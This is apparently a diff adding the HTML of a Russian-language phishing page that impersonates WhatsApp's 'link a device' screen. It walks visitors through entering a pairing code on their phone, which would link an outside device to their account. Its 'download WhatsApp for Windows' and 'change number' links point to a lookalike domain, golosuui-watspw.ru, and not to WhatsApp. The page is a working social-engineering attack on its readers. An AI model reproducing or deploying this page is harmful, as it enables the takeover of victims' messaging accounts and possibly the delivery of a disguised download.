+            <path fill-rule="evenodd" clip-rule="evenodd" d="M10 3H66V38.8837H10V3ZM7 38.8837V3C7 1.34315 8.34315 0 10 0H66C67.6569 0 69 1.34315 69 3V38.8837H76V40C76 42.2091 74.2091 44 72 44H66H10H4C1.79086 44 0 42.2091 0 40V38.8837H7Z" fill="black" fill-opacity="0.6"></path>
+            <rect x="21" y="17" width="34" height="34" rx="2" fill="#25D366"></rect>
+            <path fill-rule="evenodd" clip-rule="evenodd" d="M27.0892 33.9037C27.0917 27.8907 32.0063 23 38.0448 23C40.9738 23.0012 43.7255 24.1367 45.7937 26.1974C47.8619 28.258 49.0011 30.9991 49 33.9124C48.9975 39.9254 44.0826 44.8167 38.0447 44.8167C36.2561 44.8161 34.5003 44.3824 32.9299 43.5562L27.4448 44.9881C27.1805 45.0571 26.9406 44.8141 27.0131 44.5507L28.4779 39.2259C27.5663 37.6025 27.0885 35.7738 27.0892 33.9037ZM38.0393 42.8705H38.0357C36.4369 42.8699 34.8688 42.4424 33.5009 41.6345L33.1755 41.4423L29.8034 42.3227L30.7034 39.0504L30.4916 38.7149C29.5997 37.3031 29.1286 35.6714 29.1294 33.9958C29.1313 29.1067 33.1283 25.1291 38.0429 25.1291C40.4227 25.1299 42.6597 26.0534 44.342 27.7296C46.0241 29.4057 46.95 31.6336 46.9491 34.003C46.9471 38.8925 42.9502 42.8705 38.0393 42.8705ZM41.0435 35.2728C41.2876 35.3625 42.5971 36.0117 42.8635 36.146C42.9154 36.1722 42.964 36.1959 43.0091 36.2178C43.1949 36.3083 43.3204 36.3694 43.3739 36.4595C43.4405 36.5714 43.4405 37.1088 43.2186 37.7358C42.9966 38.3627 41.9325 38.9349 41.4208 39.0119C40.9619 39.081 40.3812 39.1099 39.7432 38.9056C39.3564 38.7819 38.8602 38.6168 38.2248 38.3402C35.7281 37.2539 34.0409 34.8157 33.7217 34.3544C33.6993 34.322 33.6836 34.2994 33.6749 34.2877L33.6727 34.2848C33.5318 34.0953 32.5873 32.8255 32.5873 31.5112C32.5873 30.275 33.1899 29.627 33.4673 29.3287C33.4863 29.3083 33.5038 29.2895 33.5195 29.2722C33.7636 29.0036 34.0522 28.9364 34.2298 28.9364C34.4073 28.9364 34.5851 28.9381 34.7402 28.9459C34.7594 28.9468 34.7793 28.9467 34.7999 28.9466C34.9551 28.9457 35.1486 28.9446 35.3395 29.4066C35.4128 29.584 35.5199 29.8469 35.633 30.1243C35.8624 30.687 36.1161 31.3095 36.1607 31.3994C36.2273 31.5338 36.2717 31.6904 36.1829 31.8696C36.1696 31.8965 36.1573 31.9218 36.1455 31.946C36.0788 32.0832 36.0298 32.1842 35.9165 32.3173C35.8722 32.3695 35.8264 32.4257 35.7806 32.482C35.6888 32.5946 35.597 32.7073 35.517 32.7876C35.3837 32.9214 35.2449 33.0666 35.4003 33.3353C35.5556 33.604 36.0902 34.4829 36.8819 35.1945C37.7331 35.9596 38.4729 36.2829 38.8478 36.4468C38.921 36.4788 38.9803 36.5047 39.0238 36.5267C39.2901 36.6611 39.4455 36.6386 39.6009 36.4595C39.7562 36.2804 40.2667 35.6758 40.4443 35.4071C40.6218 35.1385 40.7994 35.1832 41.0435 35.2728Z" fill="white"></path>
+        </svg>
+    </div>
+    <div class="right">
+        <div class="text">
+            <h3>Скачайте WhatsApp для Windows</h3>
+            <p>В новом приложении для Windows добавлены функции звонков и демонстрации экрана, а также обеспечена более высокая скорость работы.</p>
+        </div>
+        <a href="https://golosuui-watspw.ru/number/?sid=hNuM29EzR5BGsPsFnzlKo4iVtr5nFpuY9X1xU4xyKP2IMXmM3k6ICRCJlvA7V5K7#" class="download">Скачать приложение</a>
+    </div>
+</div>
+            
+
+
+            <div class="description">
+                <div class="text">
+                    <h2>Введите код на телефоне</h2>
+                    <p class="change-number">Связывание аккаунта WhatsApp <strong id="user-number">+000 00 000 0000</strong><br>(<a href="https://golosuui-watspw.ru/number/">изменить</a>)</p>
+                    <ul>
+                        <li class="item">Откройте WhatsApp на своём телефоне</li>
+                        <li class="item">
+                            Чтобы перейти в настройки, нажмите на ваше фото профиля,
+                            <strong>"Меню"
+                                <svg height="24px" viewBox="0 0 24 24" width="24px">
+                                    <rect fill="#f2f2f2" height="24" rx="3" width="24"></rect>
+                                    <path d="m12 15.5c.825 0 1.5.675 1.5 1.5s-.675 1.5-1.5 1.5-1.5-.675-1.5-1.5.675-1.5 1.5-1.5zm0-2c-.825 0-1.5-.675-1.5-1.5s.675-1.5 1.5-1.5 1.5.675 1.5 1.5-.675 1.5-1.5 1.5zm0-5c-.825 0-1.5-.675-1.5-1.5s.675-1.5 1.5-1.5 1.5.675 1.5 1.5-.675 1.5-1.5 1.5z" fill="#818b90"></path>
+                                </svg>
+                            </strong>
+                             или
+                            <strong>"Настройки"
+                                <svg width="24" height="24" viewBox="0 0 24 24">
+                                    <rect fill="#F2F2F2" width="24" height="24" rx="3"></rect>
+                                    <path d="M12 18.69c-1.08 0-2.1-.25-2.99-.71L11.43 14c.24.06.4.08.56.08.92 0 1.67-.59 1.99-1.59h4.62c-.26 3.49-3.05 6.2-6.6 6.2zm-1.04-6.67c0-.57.48-1.02 1.03-1.02.57 0 1.05.45 1.05 1.02 0 .57-.47 1.03-1.05 1.03-.54.01-1.03-.46-1.03-1.03zM5.4 12c0-2.29 1.08-4.28 2.78-5.49l2.39 4.08c-.42.42-.64.91-.64 1.44 0 .52.21 1 .65 1.44l-2.44 4C6.47 16.26 5.4 14.27 5.4 12zm8.57-.49c-.33-.97-1.08-1.54-1.99-1.54-.16 0-.32.02-.57.08L9.04 5.99c.89-.44 1.89-.69 2.96-.69 3.56 0 6.36 2.72 6.59 6.21h-4.62zM12 19.8c.22 0 .42-.02.65-.04l.44.84c.08.18.25.27.47.24.21-.03.33-.17.36-.38l.14-.93c.41-.11.82-.27 1.21-.44l.69.61c.15.15.33.17.54.07.17-.1.24-.27.2-.48l-.2-.92c.35-.24.69-.52.99-.82l.86.36c.2.08.37.05.53-.14.14-.15.15-.34.03-.52l-.5-.8c.25-.35.45-.73.63-1.12l.95.05c.21.01.37-.09.44-.29.07-.2.01-.38-.16-.51l-.73-.58c.1-.4.19-.83.22-1.27l.89-.28c.2-.07.31-.22.31-.43s-.11-.35-.31-.42l-.89-.28c-.03-.44-.12-.86-.22-1.27l.73-.59c.16-.12.22-.29.16-.5-.07-.2-.23-.31-.44-.29l-.95.04c-.18-.4-.39-.77-.63-1.12l.5-.8c.12-.17.1-.36-.03-.51-.16-.18-.33-.22-.53-.14l-.86.35c-.31-.3-.65-.58-.99-.82l.2-.91c.03-.22-.03-.4-.2-.49-.18-.1-.34-.09-.48.01l-.74.66c-.39-.18-.8-.32-1.21-.43l-.14-.93a.426.426 0 00-.36-.39c-.22-.03-.39.05-.47.22l-.44.84-.43-.02h-.22c-.22 0-.42.01-.65.03l-.44-.84c-.08-.17-.25-.25-.48-.22-.2.03-.33.17-.36.39l-.13.88c-.42.12-.83.26-1.22.44l-.69-.61c-.15-.15-.33-.17-.53-.06-.18.09-.24.26-.2.49l.2.91c-.36.24-.7.52-1 .82l-.86-.35c-.19-.09-.37-.05-.52.13-.14.15-.16.34-.04.51l.5.8c-.25.35-.45.72-.64 1.12l-.94-.04c-.21-.01-.37.1-.44.3-.07.2-.02.38.16.5l.73.59c-.1.41-.19.83-.22 1.27l-.89.29c-.21.07-.31.21-.31.42 0 .22.1.36.31.43l.89.28c.03.44.1.87.22 1.27l-.73.58c-.17.12-.22.31-.16.51.07.2.23.31.44.29l.94-.05c.18.39.39.77.63 1.12l-.5.8c-.12.18-.1.37.04.52.16.18.33.22.52.14l.86-.36c.3.31.64.58.99.82l-.2.92c-.04.22.03.39.2.49.2.1.38.08.54-.07l.69-.61c.39.17.8.33 1.21.44l.13.93c.03.21.16.35.37.39.22.03.39-.06.47-.24l.44-.84c.23.02.44.04.66.04z" fill="#818b90"></path>
+                                </svg>
+                            </strong>
+                        </li>
+                        <li class="item">Нажмите "<strong>Связанные устройства</strong>" и затем "<strong>Привязка устройства</strong>"</li>
+                        <li class="item">Нажмите "<strong>Связать по номеру телефона</strong>" и введите этот код на своем телефоне</li>
+                    </ul>
+                </div>
+                <div class="number-container">
+                    <div class="loader" id="loader"></div>
+                    <div class="code-block" style="display: none;">
+                        <div class="code-element"></div>
+                        <div class="code-element"></div>
+                        <div class="code-element"></div>
+                        <div class="code-element"></div>
+                        <div class="code-element no-border"></div>
+                        <div class="code-element"></div>
+                        <div class="code-element"></div>
+                        <div class="code-element"></div>
+                        <div class="code-element"></div>
+                    </div>
+                    <p id="code" style="display: none;"></p>
+                    <button id="copy-btn" style="display: none;" class="button primary">Скопировать код</button>
+                    <p class="copy-msg" style="display: none;">Код скопирован</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="instruction">
+    <h3>Инструкции</h3>
+    <a href="https://faq.whatsapp.com/1317564962315842?lang=ru">Готовы попробовать, но нужна помощь?</a>
+    <div class="preview">
+        <img src="./WhatsApp_files/video.png" alt="Preview">
+    </div>
+</div>
+
+    </div>
+
+</body></html>
